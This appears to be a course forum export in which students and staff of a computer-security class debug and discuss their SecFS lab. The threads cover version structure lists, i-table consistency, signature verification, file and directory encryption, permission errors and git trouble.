<div><p>Here&#39;s the trace of the error:</p>
<p><tt>httpd&#64;vm-6858:~/secfs$ handler raised &lt;class &#39;LookupError&#39;&gt; exception (asked to resolve i (&lt;uid=0&gt;, 0), but i does not exist), terminating main loop.</tt></p>
<p><tt>Traceback (most recent call last):</tt></p>
<p><tt>  File &#34;venv/bin/secfs-fuse&#34;, line 6, in &lt;module&gt;</tt></p>
<p><tt>    exec(compile(open(__file__).read(), __file__, &#39;exec&#39;))</tt></p>
<p><tt>  File &#34;/home/httpd/secfs/bin/secfs-fuse&#34;, line 613, in &lt;module&gt;</tt></p>
<p><tt>    llfuse.main(workers=1)</tt></p>
<p><tt>  File &#34;src/fuse_api.pxi&#34;, line 348, in llfuse.main</tt></p>
<p><tt>  File &#34;src/handlers.pxi&#34;, line 15, in llfuse.fuse_init</tt></p>
<p><tt>  File &#34;src/handlers.pxi&#34;, line 16, in llfuse.fuse_init</tt></p>
<p><tt>  File &#34;/home/httpd/secfs/bin/secfs-fuse&#34;, line 241, in init</tt></p>
<p><tt>    self._pre(mounter)</tt></p>
<p><tt>  File &#34;/home/httpd/secfs/bin/secfs-fuse&#34;, line 122, in _pre</tt></p>
<p><tt>    secfs.tables.pre(_reload_principals, user)</tt></p>
<p><tt>  File &#34;/home/httpd/secfs/secfs/tables.py&#34;, line 43, in pre</tt></p>
<p><tt>    refresh()</tt></p>
<p><tt>  File &#34;/home/httpd/secfs/bin/secfs-fuse&#34;, line 492, in _reload_principals</tt></p>
<p><tt>    secfs.fs.groupmap = _read_file(b&#34;.groups&#34;)</tt></p>
<p><tt>  File &#34;/home/httpd/secfs/bin/secfs-fuse&#34;, line 486, in _read_file</tt></p>
<p><tt>    secfs.store.tree.find_under(secfs.fs.root_i, fname)</tt></p>
<p><tt>  File &#34;/home/httpd/secfs/secfs/store/tree.py&#34;, line 19, in find_under</tt></p>
<p><tt>    dr = Directory(dir_i)</tt></p>
<p><tt>  File &#34;/home/httpd/secfs/secfs/store/tree.py&#34;, line 37, in __init__</tt></p>
<p><tt>    self.inode = secfs.fs.get_inode(i)</tt></p>
<p><tt>  File &#34;/home/httpd/secfs/secfs/fs.py&#34;, line 29, in get_inode</tt></p>
<p><tt>    raise LookupError(&#34;asked to resolve i {}, but i does not exist&#34;.format(i))</tt></p>
<p><tt>LookupError: asked to resolve i (&lt;uid=0&gt;, 0), but i does not exist</tt></p>
<p><tt></tt></p></div>
<h3>Followup Response</h3>
<div><p>Seems like &#96;refresh()&#96; is getting called before you read the VSL.</p></div>
<h3>Followup Response</h3>
<div><p>what exactly do you mean by read the VSL? In pre() before refresh() is called, I do load the VSL from the server.</p></div>
<h3>Followup Response</h3>
<div><p>another thing - on _reload_principals() in secfs-fuse, the secfs.fs.root_i is always (&lt;uid=0&gt;, 0)</p></div>
<h3>Followup Response</h3>
<div><p>_reload_principals() is going to refresh the public keys, so it wouldn&#39;t change root_i. _reload_principals() needs to read the .groups file, and for that it needs to know where to get that inode (so you need to have your itables updated)</p></div><hr><h1>Directory Encryption</h1>
<h3>2018-05-11T04:21:07Z</h3>
<div><p>Right now, I&#39;m encrypting the children list in the Directory class using a symmetric key by encrypting the output of pickle.loads in init. Then in add/remove, I check if encrypted, decrypt if needed, update elements, then reencrypt if needed. I guess I could pass in link_as for an additional argument into add/remove to limit access.</p>
<p></p>
<p>I&#39;m not sure if I&#39;m thinking about this correctly or what could be wrong. </p></div>
<h2>Staff Answer</h2>
<div><p>It seems fine to me. Another way you can do without using link_as is sending the key directly when try to add/remove. Still, there is nothing wrong with different design decision :)</p></div><hr><h1>Question on i-table consistency</h1>
<h3>2018-05-11T04:18:21Z</h3>
<div><p>Imagine a situation where in the i-tables of users A and B, both have some element which maps to some inode I. Suppose that A changes I to becomes I&#39;, and updates it&#39;s own i-table accordingly. If B then tries to access the same inode afterwards, it seems to me that it would be out of date.</p>
<p></p>
<p>What am I missing here?</p></div>
<h2>Staff Answer</h2>
<div><p>That&#39;s why we have to fetch VSL from the server, so that we can obtain the latest info before doing anything else. <br />Note that in this lab, we assumes that there is no concurrency.</p></div><hr><h1>Do we need to encrypt the itables?</h1>
<h3>2018-05-11T02:43:04Z</h3>
<div><p>Just want to make sure because I guess it&#39;s not a threat for people to see this data?</p></div>
<h2>Staff Answer</h2>
<div><p>No need to encrypt itables, but if you like you can implement this as an improvement :)</p></div><hr><h1>How can the server reuse code we wrote for the client?</h1>
<h3>2018-05-11T02:23:12Z</h3>
<div>In bin/secfs-server, I tried to import python files we wrote for the client, but the import failed. If I copy the exact same import statement into bin/secfs-fuse, it works. It seems to me that both of these files are launched the same way, so my questions are:

How can the import work in secfs-fuse, but not in secfs-server?

How can I reuse client code in secfs-server?</div>
<h2>Staff Answer</h2>
<div><p>I&#39;m not sure why do you have that issue, but make sure you locate your file correctly.<br />Ex.  &#96;import &lt;yourlib&gt;&#96;  for /secfs/&lt;yourlib&gt;, &#96;import secfs.&lt;yourlib&gt;&#96;  for /secfs/secfs/&lt;yourlib&gt;<br /><br />Also, make sure if you do manual testing, you will should check &#96;client.log&#96; for secfs-fuse and &#96;server.log&#96; for secfs-server</p></div>
<h2>Followup</h2>
<div>I turns out the problem is because our code does cyclic imports. If I insert the line &#34;import secfs.vsl&#34; (that&#39;s a file we added ourselves) into secfs-fuse, everything works fine. However, if I insert this same line into secfs-server, the server crashes, because it starts a cyclic chain of imports. Now why do secfs-fuse and secfs-server behave differently here? I think it is because secfs-server contains top-level statements, so the imports cannot be done lazily (delayed), while secfs-fuse only contains functions at the top-level, so the imports can be delayed and the cycles do not cause problems. Any advice on how to fix this in secfs-server?</div><hr><h1>Where do we submit the Design Doc</h1>
<h3>2018-05-11T02:07:46Z</h3>
<div><p>Is it okay if we write it in a file called DESIGN_DOC.txt in our repository?</p></div>
<h2>Staff Answer</h2>
<div><p>You can just push to your repo.</p></div>
<h2>Student Answer</h2>
<div><p>Maybe PDF to have nice formatting?</p></div><hr><h1>Who does project presentations?</h1>
<h3>2018-05-11T01:43:40Z</h3>
<div><p>Does every group need to prepare a project presentation for Wednesday, or is it only groups that didn&#39;t do the default project?</p></div>
<h2>Staff Answer</h2>
<div>If you did lab 5 you only need to get a checkoff next week. </div><hr><h1>Getting a Pyro4 error</h1>
<h3>2018-05-10T23:54:25Z</h3>
<div><p>When running test.sh, we stall at the first <tt>test ls -la</tt> after starting the new read-only client with root access. Any ideas on what might be causing this issue?</p>
<p></p>
<pre>handler raised &lt;class &#39;Pyro4.errors.ConnectionClosedError&#39;&gt; exception (receiving: not enough data), terminating main loop.
Traceback (most recent call last):
  File &#34;venv/bin/secfs-fuse&#34;, line 6, in &lt;module&gt;
    exec(compile(open(__file__).read(), __file__, &#39;exec&#39;))
  File &#34;/home/httpd/secfs/bin/secfs-fuse&#34;, line 626, in &lt;module&gt;
    llfuse.main(workers=1)
  File &#34;src/fuse_api.pxi&#34;, line 348, in llfuse.main
  File &#34;src/handlers.pxi&#34;, line 15, in llfuse.fuse_init
  File &#34;src/handlers.pxi&#34;, line 16, in llfuse.fuse_init
  File &#34;/home/httpd/secfs/bin/secfs-fuse&#34;, line 241, in init
    self._pre(mounter)
  File &#34;/home/httpd/secfs/bin/secfs-fuse&#34;, line 120, in _pre
    self.server.lock()
  File &#34;/home/httpd/secfs/venv/lib/python3.5/site-packages/Pyro4/core.py&#34;, line 185, in __call__
    return self.__send(self.__name, args, kwargs)
  File &#34;/home/httpd/secfs/venv/lib/python3.5/site-packages/Pyro4/core.py&#34;, line 453, in _pyroInvoke
    msg = message.Message.recv(self._pyroConnection, [message.MSG_RESULT], hmac_key=self._pyroHmacKey)
  File &#34;/home/httpd/secfs/venv/lib/python3.5/site-packages/Pyro4/message.py&#34;, line 168, in recv
    msg = cls.from_header(connection.recv(cls.header_size))
  File &#34;/home/httpd/secfs/venv/lib/python3.5/site-packages/Pyro4/socketutil.py&#34;, line 463, in recv
    return receiveData(self.sock, size)
  File &#34;/home/httpd/secfs/venv/lib/python3.5/site-packages/Pyro4/socketutil.py&#34;, line 181, in receiveData
    raise err
Pyro4.errors.ConnectionClosedError: receiving: not enough data</pre>
<p></p></div>
<h2>Student Answer</h2>
<div><p>When I was encountering this issue, the problem was that an error was being thrown on one of the previous tests and not getting caught in bin/secfs-fuse, so the lock wasn&#39;t getting released and the server was hanging.</p></div><hr><h1>Improvement Question</h1>
<h3>2018-05-10T18:03:08Z</h3>
<div><p>Asking for a friend, but what would anyone say is the simplest improvement to implement?</p></div>
<h2>Staff Answer</h2>
<div>Last year, I and my friend do support rm, mv and encrypt inode metadata.<div>I think choose the one you like and feel comfortable with. Choosing the part you feel that you have better understand than others can help you avoid bugs and complexity.</div></div>
<h2>Student Answer</h2>
<div><p>It depends on what part of the system you understand the most. A lot of things are simple once you understand them, but nearly impossible when you don&#39;t.</p></div><hr><h1>&#34;encrypted file has incorrect permissions&#34;</h1>
<h3>2018-05-10T16:40:45Z</h3>
<div><p>My implementation of ex 3 mostly works, except for a series of these errors. I&#39;m not changing the permissions on any of the files, and I&#39;m using the umask logic from bin/secfs-fuse. </p>
<p></p>
<p><a href="https://d1b10bmlvqabco.cloudfront.net/attach/javuduq1qek22s/i4vspcex29c38o/jh0rdk2mwjrk/encrypterror.JPG" target="_blank">encrypterror.JPG</a></p>
<p></p>
<p>It seems that read permissions are being added, but I have no idea how/where. </p></div>
<h2>Student Answer</h2>
<div>Search bin/secfs-fuse for “stat.” Whenever there is a call to _getattr, you compute the “permissions” and store them as part of the stat property.</div>
<h2>Followup</h2>
<div><p>I understand that stat. contains the permissions of the file, but I don&#39;t see anywhere where the stat object is updated. _getattr only updates entry object. </p></div>
<h3>Followup Response</h3>
<div><p>resolved in OH</p></div><hr><h1>Problem pushing to origin master</h1>
<h3>2018-05-10T16:15:37Z</h3>
<div><p>Our team is having trouble pushing to our repo. This is the output we get:</p>
<p></p>
<p></p>
<pre>git push origin master
Counting objects: 696, done.
Delta compression using up to 4 threads.
Compressing objects: 100% (678/678), done.
error: RPC failed; result=22, HTTP code = 41121.00 KiB/s
fatal: The remote end hung up unexpectedly
Writing objects: 100% (696/696), 2.95 MiB | 21.00 KiB/s, done.
Total 696 (delta 459), reused 0 (delta 0)
fatal: The remote end hung up unexpectedly
Everything up-to-date</pre>
<p></p></div>
<h2>Student Answer</h2>
<div><p>Are you on MIT SECURE? I have problems pushing or pulling from Github for classes when I&#39;m on MIT GUEST.</p></div>
<h2>Followup</h2>
<div><p>Unresolved, that wasn&#39;t the problem.</p></div>
<h3>Followup Response</h3>
<div><p>Have you pushed before? Did you do the steps?</p>
<p></p>
<pre>$ git remote rename origin upstream<br />$ git remote add origin https://6858.csail.mit.edu/git/project/&lt;Your-API-Key-Hash&gt;</pre>
<p></p></div>
<h3>Followup Response</h3>
<div><p>Yes</p></div>
<h3>Followup Response</h3>
<div><p>We&#39;d pushed the original skeleton code two weeks earlier but did not push anything in the mean time.</p></div>
<h3>Followup Response</h3>
<div><p>Resolved via stackoverflow, haha.</p></div>
<h3>Followup Response</h3>
<div><p>can you tell us how you resolved pls</p></div>
<h3>Followup Response</h3>
<div><p>See edit in the origin post</p></div>
<h3>Followup Response</h3>
<div><p>Nice!</p></div><hr><h1>Can we assume that all users/groups are set at the server init?</h1>
<h3>2018-05-10T04:18:43Z</h3>
<div><p>In the ideas for improvement, one of the options is </p>
<p></p>
<ul><li>The current design provides no mechanism for modifying the list of users or groups. Although SUNDR&#39;s design does not exclude this feature, it does introduce some additional complexities to how the VS list is verified.</li></ul>
<p></p>
<p>Does that mean that in the minimal implementation, we can assume that the list of users/groups assigned on init won&#39;t change?</p></div>
<h2>Staff Answer</h2>
<div>Yes I agree</div><hr><h1>Check-off meeting?</h1>
<h3>2018-05-10T03:39:18Z</h3>
<div><p>Is there a protocol for how we should schedule this? Is this something that&#39;s supposed to happen at office hours, during class, or...? When is the deadline to get the check-off? Thanks!</p></div>
<h2>Student Answer</h2>
<div><p>&#64;636</p></div>
<h2>Staff Answer</h2>
<div>By this weekend, you will receive the doc for choosing the check off slots (next week - mostly during TA office hours)</div>
<h2>Followup</h2>
<div><p>What can we expect during this checkoff? And do all team members have to be present?</p></div>
<h3>Followup Response</h3>
<div><p>Yes all team members should be present and be prepared to answer questions about their project.</p></div><hr><h1>Modify test script to test improvements</h1>
<h3>2018-05-10T03:23:47Z</h3>
<div><p>We added key revocation as a function in secfs.crypto, and are trying to test in in test.sh.  We&#39;ve found using &#34;python -c&#34; to be an effective way to call our function in secfs.crypto, but we can&#39;t communicate to the server at all this way, as it runs the file in isolation.</p>
<p></p>
<p>How can we expose the python method so that we can test key generation with the existing server and clients that are already mounted in the testbench?</p></div>
<h2>Staff Answer</h2>
<div><p>Here are some suggestions (I&#39;m assuming this is to trigger the key revocation?)</p>
<p>1. You could make it so that if a user&#39;s key file (the one that&#39;s passed in on file-system mount and read by <tt>init</tt> in <tt>secfs-fuse</tt>) is named &#34;user-{uid}-key-old.pem&#34;, you can call your python function, a new key will be generated, and will be used to replace the old one.</p>
<p></p>
<p>2. You could add a command line tool option in bin/ and call that in the test script, but this will require work to make it interface with the server, etc. </p></div><hr><h1>Exercise 2: Initializing groups and users</h1>
<h3>2018-05-10T02:42:04Z</h3>
<div><p>When I look at the init function in fs.py and prints groups and users, they seem to only contain user 0 but not user 1000? I&#39;m then a little confused when is user 1000 added and where is it initialized?</p></div>
<h2>Staff Answer</h2>
<div><p>Are you testing this manually or with ./test.sh? If you run ./test.sh and look in primaryclient.log, I think you&#39;ll find uid 0 and uid 1000 (httpd). The init function in fs.py is called by the init function in bin/secfs-fuse, and the list of users is from secfs.crypto.keys (users with private keys on this client). </p></div>
<h2>Followup</h2>
<div><p>how do we add the groups and users if we are to test manually.</p></div><hr><h1>Makeup Office Hours?</h1>
<h3>2018-05-10T01:10:35Z</h3>
<div><p>Is there a chance there could be makeup office hours for the one that didn&#39;t happen today? Perhaps on Friday?</p></div>
<h2>Followup</h2>
<div><p>bump :D please!</p></div><hr><h1>Raise InvalidSignature error?</h1>
<h3>2018-05-10T00:20:21Z</h3>
<div><p>Has anyone else run into this error when implementing cryptography? I am signing my VSL with a signature and then when I go to verify this signature, I get this error from the public_key.verify method in the rsa package. I have printed out the signature after I make it and before I verify it and they are identical. The errors comes from within the rsa method. Does anyone know what causes this error/how to fix it? </p></div>
<h2>Followup</h2>
<div><p>Could you try immediately verifying the signature right after it is signed? This will help narrow down if it has something to do with the signature or the method itself</p></div>
<h3>Followup Response</h3>
<div><p>I tried immediately verifying the signature and I don&#39;t get an error. What does this mean? </p></div>
<h3>Followup Response</h3>
<div>Maybe it’s something to do with how you’re serializing the object you’re signing? If you sign a dictionary. Serialize and then deserialize it, the signature would no longer work. </div>
<h3>Followup Response</h3>
<div><p>That says that your verification and signing method is correct, and the signature is fine. You mentioned that you checked that it is the same signature. I think like what Monde said, you might need to check that the data you&#39;re passing is the same (and not in a different order).</p></div>
<h2>Followup</h2>
<div><p>Hmm my code also throws this exception, but I just added a try/except... is that okay?</p></div>
<h3>Followup Response</h3>
<div><p>If you use a try/except, how do you ever verify the signatures? What do you put in the except part? </p></div>
<h3>Followup Response</h3>
<div><p>The exception usually means that the signature isn&#39;t valid, you&#39;d still want to raise that error</p></div><hr><h1>Read-Only Client Without Root Key Access?</h1>
<h3>2018-05-10T00:16:39Z</h3>
<div><p>What functionality do these tests correspond to? I tried looking at the test file but still wasn&#39;t really sure what exercise these tests fall under and how to go about getting them to pass.</p>
<p></p>
<p><img src="https://d1b10bmlvqabco.cloudfront.net/attach/javuduq1qek22s/hl484zuk5p76a6/jgzrd0uql2fl/Screen_Shot_20180509_at_7.50.34_PM.png" alt="" width="405" height="437" /></p></div>
<h2>Staff Answer</h2>
<div><p>You would want to look at the output of ro-client-without-root.err and ro-client-without-root.log to see if there is some output that would help with debugging. The read-only client doesn&#39;t have access to the root&#39;s private key, so if you&#39;re signing or trying to use the root&#39;s private key, it will fail. </p></div><hr><h1>Test script for the improvements</h1>
<h3>2018-05-10T00:01:43Z</h3>
<div><p>Are we expected to test the improvement we implement very thoroughly? We tried to use test.sh as an example but we couldn&#39;t figure out how to set up multiple clients and do all the complicated tests.</p></div>
<h2>Staff Answer</h2>
<div><p>No. Fortunately, you will only need to show us that the basic functionality from your improvement works. :)<br />To figure out how to test multiple clients, you learn from the command given in the lab handout and check the testing script.</p></div><hr><h1>exercise 2: running lab commands don&#39;t work unless root</h1>
<h3>2018-05-09T23:46:36Z</h3>
<div><p>I am running the commands at the end of Exercise 2, and get to the command </p>
<p>echo b &gt; mnt2/shared/user-file , which I run as httpd in the second client,</p>
<p>I am given a &#34;permission denied&#34; error. I ran &#34;ls -la&#34; to check that the shared directory</p>
<p>is in fact owned by the users group, so I am not sure what to do. I shouldn&#39;t have to run</p>
<p>sudo because that is not in the lab instructions and doesn&#39;t make any sense</p></div>
<h2>Staff Answer</h2>
<div><p>You are right about having correct owner and group, but that indicates how your functionality on permission fail right?<br />You will have to further investigate the bug in your implementation on why you got the permission error.</p></div>
<h2>Followup</h2>
<div><p>I&#39;m thinking about editing the permission in access. Do we still want the group-writable files to be owned by the root user or can we change it to be owned by the group? Also, given an block i with i.p is user, how do we get the gid of the i?</p></div><hr><h1>Secret-based Zero-Knowledge Verification</h1>
<h3>2018-05-09T22:06:01Z</h3>
<div><p>I don&#39;t really understand the Socialist Millionaire Protocol. How do you figure out whether or not the other person has the same answer as you without revealing this answer to a man in the middle?</p></div>
<h2>Staff Answer</h2>
<div><p>The protocol is a bit complicated. It&#39;s described here in section 4:</p>
<p></p>
<p><a href="https://www.cypherpunks.ca/~iang/pubs/impauth.pdf">https://www.cypherpunks.ca/~iang/pubs/impauth.pdf</a></p>
<p></p></div><hr><h1>Is the root user allowed to r/w/x anything?</h1>
<h3>2018-05-09T21:15:42Z</h3>
<div><p>For example, if the user is trying to write a user-owned file and they are not the owner, they shouldn&#39;t be allowed to write. Does this still apply to the root user?</p></div>
<h2>Student Answer</h2>
<div><p>No. Some of the tests test that the root shouldn&#39;t read user files that it doesn&#39;t own and such.</p></div><hr><h1>Trouble accessing usermap in second client</h1>
<h3>2018-05-09T20:18:29Z</h3>
<div><p>When I add and check for signatures for the VSes, it works for the first client but throws an error for the second client.  The error is a key error (when looking up the public key of a user in the VSL, it can&#39;t find that user in secfs.fs.usermap).  Is there a reason why usermap would be different in the 2 clients? </p></div>
<h2>Student Answer</h2>
<div><p>You need your itables in order to get the .users file (during refresh()) which will then allow you to verify the signatures. You will have to load the itables first, refresh, and then check the signatures.</p></div><hr><h1>Object Encryption</h1>
<h3>2018-05-09T20:13:49Z</h3>
<div><p>What object exactly should we be encrypting on exercise 3? Should it be the blocks list in the inode class? Should it be each individual item in the blocks list in the inode class? Is it the blob object in the blocks file? Or am I totally wrong and we should be encrypting something else?</p></div>
<h2>Staff Answer</h2>
<div><p>File content and directory content. Yes you got the right idea about encrypting each individual item in blocks list. Then next you will also need to encrypt the content in directory (Check the Directory class).</p></div>
<h2>Followup</h2>
<div><p>But our encrypt_sym(key, data) expects data to be in byte format, so do we not encrypt the blob, which is always inode.bytes()? Or would I need to convert each item in the blocks list to bytes, encrypt, and store in blocks list again? Same question for directories, with the child list?</p></div><hr><h1>test.sh hangs after ex3</h1>
<h3>2018-05-09T18:18:41Z</h3>
<div><p>I think I&#39;ve finished with implementing exercise 3; when I run &#96;test.sh&#96;, everything passes through the block about read protection. When the section &#34;Entering section Read-only client with root key access.&#34; starts, though, it gets to &#96;test ls -la&#96; and then hangs (I have no code for ex1 or ex2 on this branch). Any tips on debugging this? It doesn&#39;t seem like any logs are created during &#96;test.sh&#96;.</p></div>
<h2>Student Answer</h2>
<div><p>What happened was that one of my previous tests was throwing an error that killed the server process, so the client in the next test hangs waiting for the server to respond (the previous test didn&#39;t give an error because it was just checking that something <em>didn&#39;t work</em> - it didn&#39;t matter how (server-killing error or nice, handled error)).</p></div>
<h2>Followup</h2>
<div><p>im having the exact same problem. my primary_client.err is throwing an invalid token error in readdir. think you can give any pointers as to how you solved it? been stuck on this for a while.</p></div>
<h3>Followup Response</h3>
<div><p>invalid token for symmetric keys probably means that the data that you passed in was not in the correct format/type or was None when a real value was expected</p>
<p>the encrypt_sym and decrypt_sym methods require the data arg to be of type &#39;bytes&#39;</p></div><hr><h1>No office hours today</h1>
<h3>2018-05-09T18:15:24Z</h3>
<div><p>Hey everyone,</p>
<p></p>
<p>I won&#39;t be holding office hours today from 4:30-6:30 best of luck in your final lab and see you next week.</p>
<p></p>
<p>Lef</p></div><hr><h1>Test: failed to append to encrypted file</h1>
<h3>2018-05-09T06:21:39Z</h3>
<div><p>While implementing encryption for read permissions, I fail a test with the message &#34;failed to append to encrypted file&#34;.<br /><br />After digging into the test, it seems that the root user is trying to append to a file they own with &#34;echo y | sudo tee -a root-secret&#34;. The call to secfs.fs.read(), though, shows that httpd is trying to read from root&#39;s file, despite the sudo tee.<br /><br />This would only happen in the case that the file handle for &#34;root-secret&#34; is opened by httpd - could it be the case that there&#39;s an open handle from a previous access? How do I prevent this?</p></div>
<h2>Followup</h2>
<div><p>Just in case, can you check if your version of the code has the following in the open() method in bin/secfs-fuse: </p>
<p></p>
<pre>llfuse.invalidate_inode(inode)</pre></div>
<h3>Followup Response</h3>
<div><p>Yes, it does. I had stumbled upon that earlier too and was sad that it didn&#39;t fix the &#34;student sadness&#34;</p></div>
<h2>Followup</h2>
<div><p>As another followup, I noticed that in new_fh in bin/secfs-fuse, the fhs dictionary is declared global, but it isn&#39;t declared global in any of the places it&#39;s used in the SecFS client. I don&#39;t understand python globals very well, but this does seem strange...</p>
<p></p>
<p>I tried clearing fhs in post (and declaring fhs as global in read), but this leads to a key error as the fh no longer exists anymore and isn&#39;t recreated for the new access.</p>
<p></p>
<p>This is also causing problems for the tests &#34;couldn&#39;t read back root created file in encrypted directory&#34; and &#34;couldn&#39;t read back root appended file in encrypted directory.&#34; I haven&#39;t touched the fhs at all, so I find this issue extremely strange</p></div>
<h3>Followup Response</h3>
<div><p>We only call new_fh on open, opendir, and create... shouldn&#39;t we be calling new_fh before every operation in case a different user opened the same file previously?</p></div>
<h3>Followup Response</h3>
<div><p>Sorry for the late reply, did you manage to figure it out? I don&#39;t think it would be something wrong with the fhs / new_fh case, since most of the issue with llfuse caching in the past had to do with the open() method, hence the adding of the invalidation code. </p></div>
<h3>Followup Response</h3>
<div><p>We ended up passing the tests after making changes that seemed completely unrelated to the file handles... So in a way, yes, we figured it out :) </p></div>
<h3>Followup Response</h3>
<div><p>Great, thanks for letting me know!</p></div><hr><h1>Issues with 2nd Mount</h1>
<h3>2018-05-09T06:08:30Z</h3>
<div><p>The 2nd mount has an issue resolving because the ihash is none. Anyone else have this issue/suggestions to solve it.</p></div>
<h2>Staff Answer</h2>
<div><p>There could be many causes related to this issue. <br />More detail about an error please ex. what line cause an error?<br /><br />For example, If it is secfs.tables.resolve(i), you will need to check whether you have i in the table. Then check whether you store the hash for that i correctly. </p></div><hr><h1>Incorrect Permissions</h1>
<h3>2018-05-09T04:21:20Z</h3>
<div><p>Where do we set the permissions of a file or directory? Are we supposed to set the permissions at all? Is umask supposed to handle the permissions automatically?</p>
<p></p>
<p>I&#39;m asking because were getting the following error in lab 5:</p>
<pre>perm != -rw------- (was -rw-r--r--)
[ FAIL ]: encrypted file has incorrect permissions</pre>
<p></p>
<p>I&#39;ve read through the code a few times but I still haven&#39;t been able to find where permissions are set.</p>
<p></p>
<p>Thanks!</p></div>
<h2>Student Answer</h2>
<div><p>Look at &#96;_get_attr&#96; in &#96;secfs-fuse&#96;.</p></div>
<h2>Followup</h2>
<div><p>I looked at the _getattr function and believe the entry.st_mode has to do with the permissions set for the file/directory, but can&#39;t find any helpful documentation online on how exactly to set permissions with that. Does anyone know where any good resources for understanding how to manipulate permissions in the llfuse.entryattributes objects?</p></div>
<h3>Followup Response</h3>
<div><p>&#43;1</p></div>
<h3>Followup Response</h3>
<div><p>&#43;1</p></div><hr><h1>Hashing dicts?</h1>
<h3>2018-05-09T02:14:30Z</h3>
<div><p>The lab handout warned us that dicts are serialized indeterministically, so we have to be careful when hashing them.</p>
<p></p>
<p>But it seems that ihandle hashes are computed directly by using pickle.dumps() to create a bytes representation of the itable dictionary. Doesn&#39;t that cause issues? (Tables.py)</p></div>
<h2>Student Answer</h2>
<div><p>It doesn&#39;t matter if pickle.dumps produced different ihandles for the same file. You use existing ihandles to index into blocks to find the file you are looking for, but you don&#39;t ever take a file, generate its ihandle using pickle.dumps to verify that you got the same ihandle (this would be the only case this would be a problem).</p></div>
<h2>Followup</h2>
<div><p>But how do we get the ihandles in the first place?</p>
<p></p>
<p>If we&#39;re computing VS&#39;s, how do we get the ihandles?</p>
<p></p>
<p>It also worries me that every time you hash the itable to get the ihandle, you can get a different value. Can we change the bytes() method?</p></div>
<h3>Followup Response</h3>
<div><p>Root sets up the file system, creates a VS for its changes and sends that to the server. Any subsequent client gets the VS from the server and uses that to get the up-to-date versions of the itables. The ihandles you get here are deterministic so correspond to the correct place in the server to get the files. You don&#39;t hash itables to get ihandles, you hash files. The itables are *not* hashed, you recreate them from the VSL, they are deterministic.</p></div>
<h3>Followup Response</h3>
<div><p>hmm maybe my system is just wrong</p>
<p></p>
<p>i&#39;m trying to repurpose current_itables to work with VSLs</p>
<p></p>
<p>how would you use VSLs to replace current_itables?</p>
<p></p>
<p>would you need a fetch from the server every time you get an itable (no caching at all)? How would you ensure the server gives you the right itable if you can&#39;t hash the itable to get the ihandle?</p></div>
<h3>Followup Response</h3>
<div><p>You can use the VSL to recreate the itables for all users (this is deterministic). Then you can keep the itables in memory and make all the updates as normal. After you are done, you have to convert your changes into your own VS and send the updated VSL to the server for others to use.</p>
<p></p>
<p>You ensure that you have the right itables by having the correct VSL. You ensure that the VSL is correct by verifying signatures and total order (as described in the paper). If the VSL is correct, the itables you make from them are correct.</p></div>
<h3>Followup Response</h3>
<div><p>How can you use VSL to create itables?</p>
<p></p>
<p>VSL only has the ihandles (hashes of itables) and version numbers, it does not contain the itables nor the ihashes (hashes of inodes) that we need.</p></div>
<h3>Followup Response</h3>
<div><p>the Itable class has a load method to create an itable from bytes. I don&#39;t see how the ihandle being non deterministic is a problem though... You get an ihandle for an itable and store it there. Then everyone gets the same ihandle from the VSL, so can retrieve the right itable every time. It could very well have been saved at another ihandle value, but in that case, the VSL would still have *that* ihandle value and everyone would get the same itable bytes.</p></div>
<h3>Followup Response</h3>
<div><p>If you retrieve the itable from the server using an ihandle, how can you verify that the server has not modified the contents of the itable? It seems to me that the only way to prevent tampering would be to hash the itable and compare that hash with the original ihandle. But this will not work if the hash function is nondeterministic.</p></div>
<h3>Followup Response</h3>
<div><p>Oh, I see what you&#39;re saying. If you want to do that I guess you do have to have a deterministic way of getting the hash. But I guess that was beyond the scope of what most of us are doing (we seem to be trusting the server on this). You are probably right to not trust the server for this. If you wanted to include that in your threat model, it would probably also make sense to add this check to all files you get from the server to their corresponding hash.</p></div>
<h3>Followup Response</h3>
<div><p>Wait, nevermind. The bytes you get back from the server should still hash to the same ihandle. So you can still do the check even with this non-determinism (although it is true that we don&#39;t do the chevk you&#39;re suggesting).</p></div><hr><h1>Changed ihandles?</h1>
<h3>2018-05-08T23:12:13Z</h3>
<div><p>since pre and post have no idea what file operation went on, how do we know which ihandles got modified? Do we literally search through all ihandles to figure out what changed and what didnt?</p></div>
<h2>Student Answer</h2>
<div><p>relevant? &#64;681</p></div><hr><h1>How do VSLs even help?</h1>
<h3>2018-05-08T21:19:26Z</h3>
<div><p>The more I think about VSLs, the less sense they make. On the surface, it seems obvious what they do. But if you think deeply about them:</p>
<p></p>
<ul><li>How does a VSL ensure server honesty?</li><li>If a VSL only has the <em>latest</em> VS for each user, how does it ensure earlier modifications get made?</li><li>How should the client use the VSL? Is the VSL to ensure <em>server honesty</em> only or does it also imply client should use it to check if its files are up to date?</li><li>How does the client know which files are updated by other clients (which i-hashes) to update, since there&#39;s no global ordering on version numbers? (That is, if client B and client C both modify file X, how does client A know which to accept?)</li><li>Should the client just pull the hashes on pre() and invalidate any entries it has that are out of date so they can be re-pulled from the server on resolve()?</li><li>How does the client find out if the server is cheating?</li></ul></div>
<h2>Student Answer</h2>
<div><p></p><ul><li>How does a VSL ensure server honesty?</li></ul>
<p>Clients verify VSL signatures every time they get it from the server. The server would need valid private keys (corresponding to the public key in .users) to make any changes to the VSL without getting detected. The only way the server can do that is to change the .users file, but that can be caught if you have access to the real root&#39;s public key since the root is the only person who can modify .users. You have access to the correct root public key (take a look at secfs-fuse init()).</p>
<p></p>
<ul><li>If a VSL only has the <em>latest</em> VS for each user, how does it ensure earlier modifications get made?</li></ul>
<p>You use the VSL to get your itable. Since the VSL can&#39;t be modified by anyone who is not authorized, the only thing the server can do is drop your data, which is pretty easy to detect.</p>
<p></p>
<ul><li>How should the client use the VSL? Is the VSL to ensure <em>server honesty</em> only or does it also imply client should use it to check if its files are up to date?</li></ul>
<p>Yes, clients should check the VSL, that&#39;s how they detect malicious activity.</p>
<p></p>
<ul><li>How does the client know which files are updated by other clients (which i-hashes) to update, since there&#39;s no global ordering on version numbers? (That is, if client B and client C both modify file X, how does client A know which to accept?)</li></ul>
<p>There is a global ordering in terms of the version numbers in the version vectors.</p>
<p></p>
<ul><li>Should the client just pull the hashes on pre() and invalidate any entries it has that are out of date so they can be re-pulled from the server on resolve()?</li></ul>
<p>I think how you do this is your choice. I think there are several ways to do this.</p>
<p></p>
<ul><li>How does the client find out if the server is cheating?</li></ul>
<p>The signature verification would not work.</p>
<p></p></div>
<h2>Followup</h2>
<div><p>How do you get an itable that is not in the VSL?</p>
<p></p>
<p>Etc.</p>
<p>user A creates file X</p>
<p>user A creates file Y</p>
<p></p>
